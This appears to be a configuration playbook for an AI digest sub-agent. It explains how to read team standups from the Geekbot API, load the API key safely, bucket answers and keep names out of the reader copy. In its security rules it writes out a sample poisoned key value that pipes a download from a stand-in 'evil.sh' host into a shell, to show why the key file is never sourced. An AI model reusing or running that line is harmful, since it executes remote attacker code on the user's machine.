# Geekbot playbook — how the gather sub-agent reads team standups

Geekbot is the **3rd, weakest source** (self-reported intent — same person as the note + the ticket). It NEVER originates a reader theme and NEVER creates a "Closed" line. It only **(a) corroborates** an existing notes/ClickUp line (adds a `(per Geekbot, <date>)` citation) and **(b)** contributes the one thing notes+ClickUp lack: a labelled **"From standups (unverified)"** lane for blockers / forward intent / off-ticket work. It is **OFF unless a key is configured** — the digest must run identically on notes+ClickUp when Geekbot is absent.

Every fact below is verified against the official `geekbot-com/geekbot-mcp` source + Geekbot OpenAPI. Each is a trap that silently produces wrong output.

## Access — resolve before relying on Geekbot (free first)
- API access is a **Basic (paid) tier** feature; the free Starter plan (≤10 active participants) does NOT expose the API. **If the AUT standup has >10 active participants the team is already on Basic → the key is free.**
- The key is **personal/per-user** (no workspace/admin key). A key whose owner is a **participant of the shared AUT standup reads EVERY member's answers for that standup in ONE call** — `GET /v1/reports/?standup_id=<id>` **with `user_id` OMITTED returns all participants' reports** (confirmed in the official `geekbot-mcp` `fetch_reports`: "user_id … default None … means for all members"). So one key (Sashko's / Andy's, or a dedicated account) pulls the WHOLE team from the shared channel — exactly the goal. Never loop per person.
- **The key is LOCAL ONLY.** It lives in `~/.geekbot/env` (the user's `$HOME`, OUTSIDE this repo) as `GEEKBOT_API_KEY=...`, `chmod 600`. It is **never committed** (`.env`/`*.env` are gitignored, and it isn't in the repo tree anyway), **never printed/echoed/logged**, and **never sent anywhere** — the skill only references `$GEEKBOT_API_KEY` by name inside the curl call. The interactive `/ai-digest --setup` flow **creates the file for them** (placeholder line, `chmod 600`) and tells them to open it and paste the key after `GEEKBOT_API_KEY=` — the key goes **into the file**, never into the chat and never typed at a terminal prompt. Pin the resolved `standup_id` + question→bucket map in `~/.claude/ai-digest/config.md` (also local, not the repo).

### Coverage test (run ONCE when the key arrives, before trusting Geekbot)
```bash
# read the key as DATA — NEVER `source` it (a value like $(...) or a backtick would EXECUTE → RCE)
GEEKBOT_API_KEY=$(grep -m1 '^GEEKBOT_API_KEY=' ~/.geekbot/env 2>/dev/null | cut -d= -f2-)
GEEKBOT_API_KEY=${GEEKBOT_API_KEY%$'\r'}; GEEKBOT_API_KEY="${GEEKBOT_API_KEY//[[:space:]]/}"
GEEKBOT_API_KEY=${GEEKBOT_API_KEY#\"}; GEEKBOT_API_KEY=${GEEKBOT_API_KEY%\"}
[ -n "$GEEKBOT_API_KEY" ] || { echo "[BROKEN] ~/.geekbot/env has no GEEKBOT_API_KEY value — open the file and paste your key"; exit 1; }
WK_AGO=$(date -u -d '7 days ago' +%s 2>/dev/null || date -u -v-7d +%s)   # GNU (Linux / Git Bash on Windows) || BSD (macOS)
# key passed via stdin (-K -), NEVER argv (ps-visible / set -x leaks it):
printf 'header = "Authorization: %s"\n' "$GEEKBOT_API_KEY" | curl -sS -K - https://api.geekbot.com/v1/standups/ \
| python3 -c "import sys,json;[print(s['id'],s['name'],'->',[u['username'] for u in s.get('users',[])]) for s in json.load(sys.stdin)]"
# pick the AUT standup id, then (reuse $GEEKBOT_API_KEY from above — same shell):
printf 'header = "Authorization: %s"\n' "$GEEKBOT_API_KEY" | curl -sS -K - "https://api.geekbot.com/v1/reports/?standup_id=<ID>&after=$WK_AGO&limit=100" \
| python3 -c "import sys,json;r=json.load(sys.stdin);print('reports',len(r));print('reporters',sorted({x['member']['username'] for x in r}))"
```
PASS iff the 2nd call lists usernames **other than the key owner's**, covering the AUT roster. If only the owner → wrong key / per-person standups → re-ask; do NOT Slack-scrape.

## The gather rules (the orchestrator pastes these INLINE into the sub-agent prompt — never a file path)

### Secret + env (CRITICAL — get this wrong and it silently always-OFF, leaks the key, or runs arbitrary code)
- **NEVER `source` / `.` the key file.** `source ~/.geekbot/env` *executes* the file as shell — a value like `GEEKBOT_API_KEY=$(curl evil.sh|sh)` or a backtick would run on read (**remote code execution**). Read the value as **data** instead, inside the same Bash call as the curl (env does NOT inherit from the orchestrator's shell, so read it here every time):
  ```bash
  GEEKBOT_API_KEY=$(grep -m1 '^GEEKBOT_API_KEY=' ~/.geekbot/env 2>/dev/null | cut -d= -f2-)
  GEEKBOT_API_KEY=${GEEKBOT_API_KEY%$'\r'}; GEEKBOT_API_KEY="${GEEKBOT_API_KEY//[[:space:]]/}"  # strip CRLF + stray ws
  GEEKBOT_API_KEY=${GEEKBOT_API_KEY#\"}; GEEKBOT_API_KEY=${GEEKBOT_API_KEY%\"}                  # strip optional wrapping quotes
  [ -n "$GEEKBOT_API_KEY" ] || { echo "[BROKEN] geekbot: key file present but value empty"; }  # never proceed with an empty key
  ```
  `grep | cut` reads the literal characters after the first `=`; nothing in the value is ever evaluated. This is the **only** sanctioned way to load the key.
- **OFF vs BROKEN — loud-fail (never silently drop the source):** no `~/.geekbot/env` / empty value / no pinned `standup_id` = **OFF** (silent — the normal state; the digest runs on notes+ClickUp). A key that IS present but the API answers 401 / empty / error = **BROKEN** — do NOT downgrade BROKEN to OFF. Surface a loud `⚠ Geekbot configured but auth failed (HTTP <code>) — digest ran WITHOUT it; rotate the key in ~/.geekbot/env` line in BOTH the preflight table and the digest footer, so a dead or rotated key can't quietly remove a whole source.
- **Never put the key in argv** (`-H "Authorization: $KEY"` is ps-visible and `set -x` leaks it into traces/the artifact). Pass the header via stdin, reusing the `$GEEKBOT_API_KEY` read as data above:
  `printf 'header = "Authorization: %s"\n' "$GEEKBOT_API_KEY" | curl -sS -K - "https://api.geekbot.com/v1/reports/?standup_id=$SID&after=$F&before=$T&limit=100"`
  No `set -x`/`-v`/`-i`; body-only; scrub any echo of the key before returning. Reference the key by NAME only.

### Endpoint facts
- Base `https://api.geekbot.com/v1`; auth header is the **bare token** (no `Bearer`/`Token`).
- `GET /v1/standups/` → resolve the AUT standup id (skip if config pins it) + the `users[]` roster.
- `GET /v1/reports/?standup_id=<id>&after=<weekFromEpoch>&before=<weekToEpoch>&limit=100` — **`after`/`before` are UNIX SECONDS** (not ISO). `limit` default 30, **MAX 100** (never request 200 — it's capped → silent truncation); there is no cursor — if a week exceeds 100, narrow the window via `after`/`before` and page. **Omit `user_id`** → all members.
- Row shape: `member{id,realname,username}`, `questions[{question,answer}]`, `timestamp` (epoch seconds).

### Bounded calls (anti-hang)
≤ 3 calls total (one /standups if id not pinned, then /reports, + at most one window-page). **No per-person `user_id` loop.** If a call ERRORS, stop and mark Geekbot DEGRADED — an error is NOT "0 reports". The sub-agent gets its rules INLINE and must never open/Read/`find`/`grep` a file (same hang-guard as the other sources).

### Post-filter + bucketing
1. **UTC window:** post-filter every report by `timestamp` into the digest's UTC `[from,to)` (same clock as notes/ClickUp).
2. **Bucket by the PINNED question→bucket map**, never by re-inferring tense from text (the Geekbot Question model has no tense field). Config maps each `question` text → `PAST` | `FUTURE` | `BLOCKER` | `EXCLUDE`. Mood/ambiguous ("what are you working on?") → `EXCLUDE` (fail-closed). An unmapped question → `EXCLUDE` + a "re-inspect the map" note.
3. **Coverage floor:** `coverage = distinct_reporters / roster_N` (roster_N = the standup `users[]`). **Guard roster_N FIRST: if `roster_N <= 0` or the roster is unknown/empty** (the `/standups` call returned no `users[]`, or the config pins no roster) → Geekbot contributes **editor-file only**, exactly as a below-floor week — never divide by zero. (Without the guard, `0/0` is NaN and `NaN < 0.6` is **false**, so a 0-roster run would silently *pass* the floor and leak unreviewed standup lines into the reader copy.) Otherwise, if `coverage < 0.6` → Geekbot contributes **editor-file only** (no reader/quarantine lines) + a loud footer naming the ratio. A 2-of-7 week must never read as "the department".

### What the sub-agent RETURNS (aggregate, never per-person dump)
- A list of **enrichment hits**: for each initiative-prefix (`[AUT]/[MNB]/[MAR]/[CLT]/[HR]/[TDE]/Q2`) present in BOTH Geekbot and the week's notes/ClickUp, a one-line "Geekbot corroborates: <plain outcome>" + the report date — to thicken the existing cited line (Synthesis attaches it).
- A **"From standups (unverified)"** list: blockers + forward intent + off-ticket items that have NO notes/ClickUp line, each as a plain-language line with `(per Geekbot, <date>)`, **no names**, plus the distinct-reporter count.
- The raw per-person answers go to the **editor/audit file only** (Step 6), never to main context or the reader copy.

## Synthesis + emit rules (enforced as gates, like verb-lint)
- Geekbot **never** creates a "Closed this week" item (Closed = ClickUp `date_closed` only).
- An **achievement verb** ("advanced/progressed/shipped") on a Geekbot-touched line requires **≥2 distinct reporters AND** a corroborating notes/ClickUp line; otherwise use a literal verb ("noted", "flagged") or demote to the editor file.
- The reader copy runs the **so-what TRANSLATE gate** (allowlist outcome-phrasing) + a **jargon catch-net** (reject/translate CamelCase / ALL-CAPS / snake_case / error-codes — Pyannote/Payload/Temporal/goal_strength, not just VEXA) + the **live-roster name lint** (no `member.username`/handle/`^Name:` reaches the reader). Fail-closed; log counts.
- Geekbot lines are **cited-not-verified**: `(per Geekbot, <date>)`, never "verified/confirmed".

## config.md lines (example)
```
Geekbot: standup_id 12345 ("AUT Daily"); key GEEKBOT_API_KEY from ~/.geekbot/env (read as DATA via grep|cut, NEVER source, never print).
Geekbot question map: "What did you do?"=PAST | "What will you do?"=FUTURE | "Any blockers?"=BLOCKER | "How do you feel?"=EXCLUDE
```
